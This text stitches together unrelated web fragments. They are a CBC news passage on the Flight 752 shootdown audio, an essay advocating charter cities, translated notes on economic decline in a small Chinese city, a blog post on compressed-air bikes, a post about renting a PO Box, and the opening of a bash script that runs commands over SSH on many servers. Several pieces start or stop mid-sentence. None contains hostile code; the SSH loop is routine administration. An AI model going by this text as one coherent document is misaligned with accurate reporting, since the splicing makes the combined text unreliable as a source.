cancelling flights. Iran earns hundreds of thousands of dollars <a href="https://www.cbc.ca/news/politics/iran-airspace-canadians-downed-flight-1.5481818" target="_blank">daily in fees for allowing flights in its airspace.</a></p>  <p>"Ok, let's assume we had delayed the Ukrainian flight for ten hours. Wouldn't it have cancelled all other flights after?" said Rezaeifar on the call.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/flight-752-crash.jpg 300w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/flight-752-crash.jpg 460w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/flight-752-crash.jpg 620w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/flight-752-crash.jpg 780w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/flight-752-crash.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/flight-752-crash.jpg"></p></div><figcaption>Investigators pick up debris at the crash site of the Ukraine International Airlines plane shot down after takeoff from Iran's Imam Khomeini Airport on Jan. 8, 2020. <!-- --> <!-- -->(Nazanin Tabatabaee/WANA via Reuters)</figcaption></figure></span></p>  <p>Thomas Juneau, an associate professor of international affairs at the University of Ottawa and former analyst of&nbsp;Middle East affairs, said Iran has been insisting the investigation will be independent — and the audio recording proves&nbsp;it's not.&nbsp;</p>  <p>"Having the lead investigator saying those things on that phone call really damages that fiction," said Juneau.

Akhavan argues the audio is a new piece of evidence showing the highest levels of Iran's government chose to keep planes full of people in the sky on a day of intense military activity.&nbsp;</p>  <p>"The senior leadership of the government willingly and knowingly disregarded these risks," said Akhavan. "This is not just a question of human error or mistake. It's a question of criminal&nbsp;recklessness.</p>  <p>"To knowingly put civilian aircraft in harm's way, to use civilian airliners in effect as human shields, clearly implicates criminal responsibility."</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/ps752-victims.jpg 300w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/ps752-victims.jpg 460w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/ps752-victims.jpg 620w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ps752-victims.jpg 780w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/ps752-victims.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ps752-victims.jpg"></p></div><figcaption>Dozens of Canadians, as well as students and academics studying in Canada, were killed in the downing of Flight 752.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Crash investigator in immediate contact with military</h2>  <p>Akhavan also said the audio implicates&nbsp;the investigation team in a cover-up.</p>  <p>In the recording,&nbsp;Rezaeifar —&nbsp;who was the head of the accident investigation board at the Iran Civil Aviation Organization at the time — says he&nbsp;picked up the phone five minutes after the plane crashed and was in immediate contact with Iran's military.</p>  <p>Rezaeifar said Amir-Ali Hajizadeh, the commander of the Aerospace Force of the Islamic Revolutionary Guard Corps (IRGC), admitted the military was ordered to shoot missiles due to national security concerns.</p>  <p>"I was informed at 6:30 a.m. and I called the IRGC at 6:35 a.m. and asked, 'Did you have a missile attack?'" Rezaeifar says in the recording. "Mr. Hajizadeh explained and said&nbsp;yes, and we had orders. He said there are some national security considerations in the country."</p>  <p>On January 11, Iran's military admitted it unintentionally shot down the plane and blamed human error, saying the military&nbsp;mistook the jetliner for a hostile target. That acknowledgement&nbsp;came after three days of denial and after satellite evidence showed&nbsp;that missiles had hit the aircraft.</p>  <p>Rezaeifar did not respond to CBC's request for a comment.

Soleimani has been an outspoken critic of Tehran since his wife Elnaz Nabiy died in the crash.</p>  <p>In that Instagram post, Soleimani wrote Iranians&nbsp;won't forget about the crimes the regime has committed against its own people.</p>  <p>"Please delete it from your Instagram," Rezaeifar tells&nbsp;Soleimani on the call. "Do you agree that out of 83 million people of Iran, only 10 or 12 people have hurt you? Why should those other 82 million people be insulted by this post?"</p>  <p>He then asks Soleimani if he thinks the Canadian government is more "benevolent" toward him.&nbsp;</p>  <p>"Are you certain that the whole Canadian government is good and uncorrupt?" asked Rezaeifar.</p>  <p>Two days later, Soleimani&nbsp;said,&nbsp;Iran's Ministry of Intelligence contacted his family members in Iran to exert more pressure on them about his behaviour on social media.&nbsp;</p>  <ul>   <li> <p><a href="https://www.cbc.ca/news/politics/iran-flight-752-ukraine-international-airlines-crash-1.5521377" target="_blank"><strong>Families of Flight 752 victims report threats, acts of intimidation — and blame Tehran</strong></a></p> </li>  </ul>  <p>"It's ridiculous," Soleimani told CBC News.

And I told him,&nbsp;I told him I have nothing to lose,&nbsp;so you cannot stop me by just threatening me by conversation over the phone."</p>  <h2>'Inappropriate' for investigator to pressure&nbsp;family member</h2>  <p>Juneau said it's "totally inappropriate" and "absurd" for the lead crash&nbsp;investigator&nbsp;to put pressure on&nbsp;a victim's family member in Canada. He also said it's not surprising.</p>  <p>"I did not expect the investigation to be independent and few serious analysts did," Juneau said. "This basically confirms it.</p>  <p>"It's not very smart. It's just not a good move."</p>  <p>He said the practice&nbsp;of the Islamic Republic is to exert psychological&nbsp;pressure,&nbsp;and often physical&nbsp;pressure, on anyone opposed to the regime,&nbsp;at home and abroad.</p>  <p>Juneau said he wants to know the extent of Rezaeifar's relationship with the IRGC and Iran's&nbsp;Ministry of Intelligence. He cautions the details of what Rezaeifar said on the recording might not be accurate, and might have been meant to exert pressure on Soleimani.</p>  <p>"Is it true?" said Juneau. "Is he boasting? Is he exaggerating some things to increase the level of intimidation towards family members? These are all questions that we don't know the answer to."</p>  <p>Syrine Khoury, press secretary to&nbsp;Foreign&nbsp;Affairs Minister&nbsp;François-Philippe Champagne, sent a written statement to CBC&nbsp;saying "interference with Canadian citizens is totally unacceptable, very troubling and won't be tolerated.</p>  <p>"The government of Canada denounces any and all attempts to coerce or pressure Canadians, especially those suffering the loss of a loved one," she added. "The government of Canada encourages anyone who feels threatened, unsafe or vulnerable to contact local law enforcement authorities."</p>  <p>Ralph Goodale, Canada's special adviser to the Trudeau government on the&nbsp;Flight 752 file, said the phone call&nbsp;"constitutes outrageous behaviour."</p>  <p>"It's wrong on every count of procedure, propriety, appropriateness. It's simply completely wrong," he said.&nbsp;</p>  <p>He added the International Coordination and Response Group formed by&nbsp;Canada, Ukraine, Sweden, Afghanistan and the United Kingdom to support victims' families will be investigating&nbsp;Rezaeifar's&nbsp;"interesting and provocative" comments about keeping the airspace open to see if there's truth to the remarks.&nbsp;</p>  <h2>Audio casts doubt on past reports</h2>  <p>Hamed Esmaeilion, the interim spokesperson for the association representing the families of the Canadian victims, said the recording raises serious concerns about the two reports Iran's Civil Aviation Organization has already published about Flight 752. Esmaeilion lost his wife, Parisa Eghbalian, and their nine-year-old daughter Reera in the destruction&nbsp;of Flight 752.</p>  <p>"I don't see any different between Rezaeifar and the new investigator," he said. "CAO is not independent. The whole organization is closely working with the IRGC."</p>  <p>Iran is expected to publish another report on the crash&nbsp;before heading to France on July 20 to download and analyze the plane's flight data recorders, according …</p></span></p></div></div>

When entrepreneurs compete to offer better goods and services, good ideas "win" and spread. Older, less effective ways of doing things wither and die. As basic research and scientific breakthroughs advance what's possible, entrepreneurs with ambitious visions introduce new and better ways of doing things. In an open society with a market system, each of us is incentivized to learn from what works and creatively solve problems for each other. This is why our economy continues to grow, and goods and services continue to improve over time.									</p><p>As the world’s economy has grown more and more dynamic, governments haven’t kept up. Competition has destroyed many lumbering corporate bureaucracies; government bureaucracies have only grown. Automobile speed, safety, and reliability have increased by countless orders of magnitude since the invention of the Model T Ford; the time it takes government to build needed infrastructure has skyrocketed. Decades of innovation in infotech and logistics have brought us just-in-time supply chains and efficient procurement. Government procurement in America hasn't kept up with these best practices because it lacks transparency, incentives, and accountability. One example - out of thousands - that is particularly salient and frustrating today is that the US government spent millions on a contract for in- case-of-emergency ventilators that were never delivered even as COVID-19 became a national crisis. It’s obvious that the forces tied to our growing prosperity haven’t trickled over to public policy.&nbsp;</p><p>I am an American patriot and continue to spend much of my career helping to fix the government we have. Thousands of governments work with software companies I have founded such as OpenGov, Esper, and Palantir, which help better allocate trillions of taxpayer dollars, bring data and transparency to the regulatory state, or use cutting-edge technology to enable new workflows to achieve public policy goals and save billions of dollars compared to how things were done before. We’re proud to have partnered with extraordinary people in government to achieve great things. But fixing government from the inside is not enough; American government is too big and too entrenched in outmoded processes and only loosely accountable to the American public.&nbsp;</p><p>This is why I’m attracted to the concept of “charter cities”: legally independent city-states, or “special economic zones” which are free to innovate and establish better modes and methods of government than existing players. We should combine the lessons from the past century with new technologies to improve transparency, hold public servants accountable, and make government work better. The best way to drive innovative governance is for governments or aspects of governments to compete for citizens just as companies compete for customers. Governments must constantly innovate, respond to changing circumstances, and invent or adopt better ways of doing things – or else lose out to competitors.&nbsp;</p><p>I support the work of Patri Friedman at Pronomos Capital, Mark Lutter at the Charter Cities Institute, Balaji Srinivasan, and others in the space on the conviction that the concept of a charter city is revolutionary. Layers and layers of bureaucracy, lack of accountability, and other mistakes have enabled cost disease and crony capitalism in critical sectors, reduced the dynamism of our economy, and made the cost of living skyrocket for our middle and working classes. We need a revolution in governance.&nbsp;</p><figure id="w-node-bd55c1be8db6-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effaad138630803dbfb48b7_FRAME_03_v04_HD.jpg" alt=""></p><figcaption>(An example of a charter city set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>It’s difficult for human beings to understand the idea of positive-sum growth. Intuitively, anything my neighbor gains is a loss for me. In one sense, that’s true. As Nobel prize-winning economist Paul Romer explains, the world of physical objects - or collections of atoms - is finite and zero-sum. Any&nbsp;object I obtain is a loss for you and vice versa. So how is positive-sum growth possible? Ideas. Good ideas rearrange the world in ways that make the things in it more valuable.&nbsp;</p><p>The practice of farming, for example, didn’t create new atoms even as it dramatically expanded the food supply. It was a good idea that changed the world to make it more useful, allowing humanity to support a larger population at less cost. Bad ideas do the opposite. Soviet collectivized farms, for example, cost millions of lives.&nbsp;</p><p>Markets are positive-sum because good ideas are valuable. If I buy something from you, I’m telling you that I value what you’ve made. If you make a profit, it means you’ve increased the value of whatever raw supplies you started with. If you make a loss, you’ve destroyed value. A free market without cronyism is a machine that increases the value of the world by rewarding good ideas and punishing bad ones. When ideas compete, we all win because the best ideas change the world in ways that make all of us more prosperous.&nbsp;</p><p>Some of the most powerful ideas find expression in our laws and shape the actions of entire communities. The best collections of ideas - such as the United States constitution or English common law - don’t just change the physical world but establish frameworks within which people may act. Good laws make for a more prosperous society. Bad laws, such as those in Venezuela or North Korea, can have disastrous effects on everyone.&nbsp;</p><p>Unfortunately, governments improve more slowly than individuals and corporations because they face much less competition and their citizens have little choice. When a company does things badly, consumers punish it by buying a competitor’s product. But if your government taxes you to pay for something that's wasteful or inefficient, you can’t respond by not paying taxes. You can try to help design and support a more efficient version of the scheme, but politics, unlike markets, are not generally a place where the best ideas win or where the relevant ideas are even discussed. Ultimately, bad policies reduce economic growth and decrease tax revenues, but this takes years or decades, and government today is such a giant kludge of disparate aspects that it’s hard to tell which policies were at fault.&nbsp;</p><p>In theory, people can always move from one country to another. One might think that the threat of political “exit” would force countries to compete for citizens just as companies compete for customers - and to some degree this does happen at extremes. Countries with better laws attract more citizens and tax revenue and prosper over time [such as net inflow into the US]. Countries with bad laws lose population and power [such as Venezuela]. But there are serious barriers to political exit. It’s time- consuming and expensive to move, and it’s sometimes difficult to get permission to enter a new jurisdiction. Further, many countries have distinct advantages - such as tremendous natural resource endowments - that shelter them from the consequences of mismanagement. Finally, the best countries attract talented individuals who themselves attract others, and though laws make a difference over the long-run, network effects can persist for a long time even when beset by poor government.&nbsp;</p><figure id="w-node-a693ac26f297-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effab5f6dc9fca333884f6f_FRAME_01_v03_HD.jpg" alt=""></p><figcaption>(Set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>Charter cities are new cities, founded on unpopulated land [we are lucky - the vast majority of land is still open!], which are allowed autonomous commercial law and semi-autonomous governments and justice systems. The idea is simple: found new cities, free from old bureaucratic and legal structures, and explore bold new visions of how government should work. Market them to people who choose to join and see what the world learns.&nbsp;</p><p>Charter cities must attract new residents to survive. This is a powerful incentive to make laws clear and fair, build responsive public institutions, provide economic opportunity, and come up with new ideas to outcompete incumbent competitors. There’s no one way to achieve these ends, so charter cities will also compete with each other to design and implement innovative governance regimes.&nbsp;</p><p>We know that competition in government works because it’s been done before. The United States, for example, is prosperous in part due to a federalist system that forces each state to compete as a laboratory of democracy within a federal framework that makes it easy to move from state-to-state. 1846, for example, New York became the first state to fully abolish rules for corporate charters under which corruption was rampant because the legislature used to decide which businesses were allowed to incorporate. Over the latter half of that century, this measure spread from state to state and became ubiquitous.&nbsp;</p><p>Of course, the biggest success stories come from the most radical experiments. Over the course of a century, Hong Kong developed from a standard port city into one of the most prosperous cities in the world - even as mainland China stagnated under communism. Good laws made Hong Kong wealthy. The Chinese, recognizing this, set up in 1980 a special economic zone in the Shenzhen area nearby where some normal economic restrictions were waived to more closely resemble Hong Kong. The area grew by more than an order of magnitude in population and prosperity in the first 20 years of its existence. Deng Xiaoping’s special economic zone experiments were the basis for China’s gradual liberalization. By showing what kinds of laws attract capital and commerce, Hong Kong and Shenzhen transformed all of China.&nbsp;</p><p>The most successful charter cities will likely guarantee and protect individual liberties, have a fair legal system with clear and just laws and decisions based on precedent, and treat businesses and workers fairly with a transparent regulatory structure. These features have made several small cities like Hong Kong and Singapore …</p></div></div></div></div></div>

<p>Even with so much<span></span> <span>“</span>the sky’s falling in China” rhetoric, you’ll still find a lot of optimistic, forward-looking people here. But there’s a stark contrast between attitudes in Beijing/Shenzhen/etc and sub-tier 1 cities that urbanization has seemingly left behind.</p>
<p>Below are observations Chinese millennials made when they visited their hometowns during this year’s Spring Festival week (aka Chinese New Year). These were shared on Wechat a bit (unknown who original curator is). I thought it’d be interesting to translate and re-share here.</p>
<h3 id="observation-of-a-tier-4-chinesecity">Observation of a Tier 4 Chinese&nbsp;city</h3>
<ol type="1">
<li>As local coal mines goes from reducing and suspending production to filing bankruptcy, their workers are first delayed and denied wages before being laid off.</li>
<li>The local real estate market is stagnant. Ongoing construction projects are left unfinished. Completed property don’t sell.</li>
<li>Local cigarette factories see their sales over the past year go into decline and begin to cut production.</li>
<li>Food and fruit princes drop. So does the income of farmers.</li>
<li>More labor sitting idle and less income for workers.</li>
<li>Infrastructure construction continues to go strong. The business at a local stone supplier to road construction projects is flourishing.</li>
</ol>
<p>Reflection:</p>
<ol type="1">
<li>The energy sector, including coal and oil, and real estate sector are the first to be affected by the economic crisis. The situation continues to deteriorate, with no optimistic outlook.</li>
<li>The reach of the economic crisis is expanding to more sectors. Even cigarette companies, which have enjoyed high profit margin, are suffering. The management pins the blame on the restriction on consumption using public funds. The restriction has been in place for a number of years, its impact is already evident from the plummeting stock prices of white liquor or baijiu manufacturers. However, during all these years, the margin of cigarette industry has remained stable. An article published last year even said that the cigarette industry was the most lucrative business in China. Therefore, what is going on in local cigarette companies is related to local economy and local income.</li>
<li>The revenue decline of coal mines and cigarette factories, which used to be local cash cows, will trigger a series of consequences and affect the overall local consumption level. As a result of layoffs and shrinking demand, local spare labor force has grown. The income of local workers has declined due to an oversupply of labor.</li>
<li>Infrastructure construction is the only sector holding up while coal mines, local consumption and real estate are suffering. Considering the backwardness of the local infrastructure, this sector still has room to grow, as long as investment is in place. But where does the money come from? Local government is already heavily in debt. It all comes down to how much the central government is willing to support.</li>

<li>Local automobile part factories and steel plants close down.</li>
<li>Heavy polluter chemical industry is doing fine, but production is limited.</li>
<li>Advertisement agencies are doing alright.</li>
<li>Plenty of car sales were made at the second half of 2015, with many new cars spotted on the road.</li>
<li>Tourism industry has declining sales.</li>

<li>Economy seems to be really struggling. Several large local clothes OEMs are faced with the risks of closing down. Making money is becoming increasingly difficult. So is collecting receivables.</li>
<li>Sales are difficult to make in the real estate sector.</li>
<li>Quality commercial property is needed.</li>
<li>Retail sellers on Wechat are everywhere. Overseas shopping agents are on Wechat. People go on the platform to sell designer handbags from local OEMs, clothes and even vegetables and honey. It is the absolute trend. Wechat public accounts have penetrated almost every industry. For example, by following the Wechat public account of a karaoke place, people can order and switch songs on their phone. An extremely popular local account is Zhang Shang Ji Mo, a local fusion of portal website, meituan and 58.com. It is said that even some villages have their own public accounts on Wechat.</li>
<li>Taxi hailing apps are highly popular.</li>
<li>Traffic congestion is serious.</li>
<li>Smog is serious in winter, but no one cares about the level of <span>PM</span> 2.5. No one on the street wears masks even when <span>PM</span> 2.5 level shoots over 300.</li>
<li>Gyms have recently begun to grow. Whether you are a worker, a small business owner or a civil servant, everyone loves iPhone, but many of those over 40 years old use Huawei or even Oppo phones.</li>

<div><h2>Compressed air is a sustainable alternative to batteries and fossil fuels. Despite this, it has been disappearing from the public eye.</h2>
<p>I first became interested in compressed air as a fuel source during a visit to The Hartebeesthoek Radio Astronomy Observatory (HartRAO) during a cub-scout camp many years ago. We made rockets out of Coca-Cola bottles pumped up with a bicycle pump; makeshift fins held on with cello-tape. After a brief pumping the pent-up energy overcame the nozzle’s friction, the bottle-rocket would detach from the pump, and would blast off into space.</p>
<p>Alternative forms of energy storage have always been fascinating. From <a href="https://en.wikipedia.org/wiki/Pumped-storage_hydroelectricity"> pumped hydroelectric energy storage</a> to <a href="https://en.wikipedia.org/wiki/Flywheel_energy_storage">flywheel energy storage</a> . I recently stumbled upon this article on Low-Tech magazine about <a href="https://solar.lowtechmagazine.com/2018/05/ditch-the-batteries-off-grid-compressed-air-energy-storage.html"> compressed air energy storage (CAES)</a> . It rekindled my interest in using compressed air as a way to conserve power, overcoming the <a href="https://en.wikipedia.org/wiki/Duck_curve"> duck’s head problem</a> of some sustainable energy production techniques like solar and wind power.</p>
<p>The concept of CAES is fairly simple: compress air while there is energy production (the sun is up) for later use. The flow of energy can then be turned up or down depending on the demand by increasing or decreasing the flow of air.</p>
<p>Larger-scale CAES plants are fairly inefficient since compressing air generates heat (the second law of thermodynamics) and decompressing air cools it down significantly. Due to this, we will not be talking about CAES for large scale power storage, but for powering vehicles. Specifically, the humble bike.</p>
<p>A compressed-air vehicle is fuelled by tanks of pressurised atmospheric gas and propelled by the release and expansion of the gas within a pneumatic motor. These vehicles are comparable to battery-powered vehicles, with energy generation being displaced from the vehicle itself to a power plant where lower source emissions are possible and the net production of pollutants can be reduced.</p>
<p>The energy is stored in a pressurised tank on the vehicle which can be refilled or swapped out (hypothetically) at service stations, or refilled by plugging an onboard compressor into the electricity grid. Compressed air in 300 bar containers has energy density comparable to lead-acid batteries.</p>
<p>There have been few examples of compressed air vehicles in history such as the Gottardbahn pneumatic locomotive and <a href="https://en.wikipedia.org/wiki/Fireless_locomotive"> Fireless locomotives</a> .</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/07/CompressedAirLocomotive_Section1_AdolpheBraun1811to1877.jpg" alt=" Gotthardbahn"></p>
<p>Torpedos have also been known to use compressed air as a propulsion mechanism.</p>
<h3>What makes pneumatic vehicles interesting?</h3>
<p>The sounds of a city are the sounds of traffic. During the first week of lockdown was the first time I had ever heard a truly quiet city. The sounds of vehicles dominate the soundscape of cities. A city without internal combustion engines would be a much more peaceful place to live.</p>
<p>The cost of building pneumatic bikes are potentially much smaller than both internal combustion and electric motorbikes due to the simplicity of their design and the lack of special materials required in their construction. Lest we forget, internal combustion engines work by carefully exploding fuel and directing the explosions in a useful way.</p>
<p>Compressed-air vehicles are comparable in many ways to electric vehicles in their advantages but without the need for environmentally hazardous chemicals such as gasoline or battery acids/metals. Cylinders also do not need to be changed out every few years like electrochemical batteries and have a much longer operational life due to the simplicity of their structure.</p>
<p>The rate of self-discharge is very low when compared to batteries that deplete their charge slowly over time. Therefore, the vehicle may be left unused for longer periods than electric alternatives.</p>
<p>These cylinders can be swapped out at filling stations easily or charged while parked using solar power or done at home by hooking it up to the electrical grid.</p>
<p>Due to social distancing measures taken in big cities such as London and Paris, cycling for transport has spiked again, with new cycle-only paths and roads becoming the norm. Having personal vehicles as opposed to taking public transport will be standard for the foreseeable future while we deal with this pandemic.</p>
<h3>There are some downsides</h3>
<p>Any conversion of energy between forms results in a loss. For compressed-air cars, energy is lost when electrical energy is converted to compressed air, and when that stored energy is converted into kinetic energy to turn the motor.</p>
<p>When air expands it cools dramatically. This energy loss could be used for something, but for now let’s just assume that it is lost to the atmosphere on an air-powered motorbike. Similarly, tanks get very hot when filled rapidly. SCUBA tanks can be immersed in water to cool them while being filled, but this also results in energy loss.</p>
<p>Refuelling a compressed air container at home may take as long as 4 hours, while refilling on specialised equipment may fill the tank in 3 minutes while dealing with the excess heat in some (hopefully productive) way.</p>
<p>The final issue with CAES for propulsion is that while batteries can somewhat maintain their voltage throughout their discharge, the pressure of compressed air tanks falls as the air is released, effectively providing less propulsion over time.</p>
<h3>Experimental cars and bikes</h3>
<p>For this article, we will be focussing specifically on bikes, as there are a few problems with air-powered cars as the power necessary to propel a car is vastly greater than the amount necessary to propel a bike. While the majority of the energy required for driving a car is used in moving the car itself, the inverse is true for a bike where an air propelled bike would likely weigh half of the weight of the rider.</p>
<p>There have been a whole host of functional prototypes for bikes running on nothing but compressed air. The <a href="https://web.archive.org/web/20110218141158/http://www.ecofriend.org/entry/eco-bikes-green-speed-air-powered-motorcycle-aims-to-smash-land-speed-record/"> Green Speed Air Powered Motorcycle</a> using the Angelo Di Pietro compressed air engine made some noise in 2009.</p>
<p><img src="https://inhabitat.com/wp-content/blogs.dir/1/files/2012/11/o2-pursuit-final_363-600x480.jpg" alt="O2 Pursuit"></p>
<p>In 2011 the <a href="https://www.coroflot.com/deanbenstead/O2-Pursuit-Prototype"> O2 Pursuit Prototype by Dean Benstead</a> boasted a range of 100km per tank and top speeds of 140km/h, using a modified Yamaha WR250R and also using EngineAir’s Angelo Di Pietro motor. It even won a <a href="https://newatlas.com/2012-james-dyson-award-finalists/24630/"> James Dyson award</a></p>
<p>There have been multiple successful engineering projects. Some built by engineering students, some by hippies or handymen at home. <a href="https://bikeportland.org/wp-content/uploads/2016/03/pneu-Cory-lead-ted-800x789.jpg"> Cory Little</a></p>
<p>Even Peugeot, Suzuki, Toyota, and Tata had some form of air-powered vehicles in the works.</p>
<h3>Then things go silent</h3>
<p>My research on pneumatic vehicles took me on nostalgia-inducing trips through the “old internet” of personal blogs, unmaintained news sites, and enthusiast journals. There were a LOT of broken links as web pages were removed over the years, domains expired, and server fans stopped spinning.</p>
<p>Around 2012 talk about pneumatic and air-powered vehicles goes quiet. The plans of releasing some promising pneumatic motorbikes to the public seems to completely disappear. Toyota, Tata, Peugeot and Suzuki (as far as I can tell) abandon their plans to release air powered vehicles. <a href="https://en.wikipedia.org/wiki/AIRPod"> 1</a> <a href="https://www.lesechos.fr/2015/01/psa-la-revolution-de-lhybrid-air-naura-pas-lieu-190742">2</a></p>
<p>I’m generally not a conspiracy theorist, but I believe that air-powered vehicles may have been suppressed (see what I did there). The technology is sound, and if prototypes built by engineering students can work well enough, imagine what could happen if a well-funded company developed an air-powered motorbike.</p>
<p>Maybe there’s something I don’t know about. Maybe the tech is actually a lot more complicated than I am led to believe, but that still leaves the question: Who killed the pneumatic bike?</p>

<p><em>Because bacon takes forever to cook I’m writing this entire thing from the kitchen. Make your jokes accordingly. </em></p>



<p>The number one suggestion I see for people trying to get a following for their newly written book, program, etc is to start a newsletter. Here in the US at least that has some rules that go along with it. Sure, you can start a newsletter with a few dozen folks, send an email each month and not end the world. However, if you want to set up a real email service you’ll need to add something to the very end of it, your address. <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">Legally in the US you have to put both a real working unsubscribe link and a real live address. </a>Mailchimp, Substack, and Tinyletter all have this built in when you set up your profile the address you put in gets added automatically. </p>



<p>You don’t want to put your physical home address on the wilds of the internet. I’m sure someone out there has your credit card info in a txt file along with your real address, but what we’re worried about is the 99.9999% of other folks out there who don’t need extraordinarily easy access to that info. Not everyone has a work office address either. </p>



<p>Is a PO Box expensive? Depends on the size of box. The smallest one at my Post Office is about $6.25 a month, just a dollar over what I pay for my web hosting. Not so bad is it? Typically they charge in blocks of 3, 6 , or 12 months and send you little reminders that your account is about to get charged, no shady business with the USPS. I haven’t bought one of the boxes from UPS or other commercial mail services but I’m sure they are similar. </p>



<p>Did I get a PO Box just for a newsletter? No, I originally got it to connect to my Ham radio information. When I got my license I had planned on buying some cool equipment and connecting to other hams and doing what’s called DXing and swapping QSL postcards after making contact. I<a href="https://en.wikipedia.org/wiki/QSL_card">t’s a super old custom but really cool. </a>Unfortunately I don’t’ have the hardware to do it just yet but maybe someday. </p>



<p>So I kept the PO Box. Luckily I had discovered fountain pens and with fountain pens come the excuse to use them on things like, you guessed it, writing letters. I found a few penpals on a subreddit but like most things there the letters dried up after two or three responses. It’s hard to keep in touch when either recipient gets busy. But it was nice to have a PO Box to let a stranger send me letters as opposed to handing out my real address. </p>

<p>Still, I kept the PO Box. Then I started the newsletter. Every self published book marketing guru on the planet claims that starting a newsletter and growing it to a billion numbers will result in sales for your fantasy/romance/scifi novel. Unfortunately I don’t write for any of those genres and my newsletter grew stagnant after about fifty subscribers. The thing about commercial fiction is that you have to write commercial fiction to use succeed in their marketing tactics. </p>



<p>But hey, I still have the PO Box! But why? Well, I started sending postcards to friends and family. Not to sell them anything but to send thanks for something that would otherwise seem less personal in a text message. I put the PO box as the return address for these cards should someone else see the basically public note. </p>



<p>This is all great for me but what good is a PO Box for other folks? Literally any time you need to ship something to a person you don’t really know you should be using one. If you make 3D prints or printer components you want to use a PO Box to send parts from. If you develop PCB’s for your hobby and need to ship them to folks you’ll want to use one too. Really anything you make that you want to send to people you don’t <em>really</em> know. Stickers, zines, t-shirts, your bands latest album. With the whole selling things in a physical location being in the trash right now you can’t stand on the corner and sling products, you need a PO Box. </p>



<p>I guess this is the section where I put the pros and cons so here we go:</p>



<h4>Pros</h4>



<ul><li>Public Location Security</li><li>Cheaper than Netflix</li><li>Extra set of keys to feel important</li><li>Support your local post office</li></ul>



<h4>Cons</h4>



<ul><li>You have to drive to the post office to check the mail</li><li>They do cost money</li><li>You have to keep up with another set of keys</li><li>PO Box can’t be used as an address to register a business</li></ul>



<figure><img src="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg" alt="" srcset="https://jetgirl.art/wp-content/uploads/2020/07/920x920.jpg 920w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-300x225.jpg 300w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-768x576.jpg 768w, https://jetgirl.art/wp-content/uploads/2020/07/920x920-580x435.jpg 580w" sizes="(max-width: 920px) 100vw, 920px"><figcaption>Bianca Waters – mySanAntonio</figcaption></figure>



<p>For some people who live out in the boonies, travel for extended periods of the year, or change apartments every 6 months a PO Box is a must have. Folks who have individual mailboxes are prone to easily stolen mail. Those of us with the big mailbox hub in a subdivision already know what it’s like to have mail come in a little locked box. Even those can be compromised as they’re out in the open and typically unlit at night. </p>



<p>I could come up with more reasons but the two packs of bacon are done and the battery on the laptop is about to die. Hope you enjoyed this wall of text. Enjoy your 4th of July weekend!</p>

<p>There are complex solutions available for server management, some of you might even be on the <em>containerization train</em>.
Sometimes you just want to run a quick command on every server, it could be a one off to check <code>uptime</code> or a simple
check for <code>lockfiles</code>. Here’s a simple script which runs a shell command on a list of servers.</p>
<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>set</span> <span>-u</span>

<span>ACTION</span><span>=</span><span>${</span><span>1</span>:?<span>"Must supply action"</span><span>}</span>
<span>HOST</span><span>=</span><span>${</span><span>2</span>:?<span>"Must supply host name"</span><span>}</span>

<span>source</span> ./scripts/lib.sh

<span># Expand host string</span>
<span>HOSTS</span><span>=</span><span>"</span><span>$(</span>GET_HOSTS <span>$HOST</span><span>)</span><span>"</span>            <span># GET_HOSTS is a lists all hosts</span>

<span># Command to SSH</span>
SSH_COMMAND<span>()</span> <span>{</span>
    <span>local </span><span>ip</span><span>=</span><span>"</span><span>$(</span>GET_IP <span>$1</span><span>)</span><span>"</span>           <span># GET_IP is maps hostname to IP</span>
    ssh <span>"</span><span>${</span><span>TARGET_USER</span><span>}</span><span>@</span><span>${</span><span>ip</span><span>}</span><span>"</span> <span>"</span><span>$2</span><span>"</span>
<span>}</span>

<span># Run command for each host</span>
<span>declare</span> <span>-A</span> results
<span>for </span>H <span>in</span> <span>$HOSTS</span><span>;</span> <span>do</span>
    <span># Redirect output to a temp file, later redirect back to stdio</span>
    <span>temp</span><span>=</span><span>$(</span><span>mktemp</span><span>)</span>
    <span>exec</span> &amp;&gt; <span>${</span><span>temp</span><span>}</span>

    <span># Not the '&amp;', this creates a background process.</span>
    <span># We also source the env on the host,</span>
    <span># as .bashrc and .bash_profile are finicky at times</span>
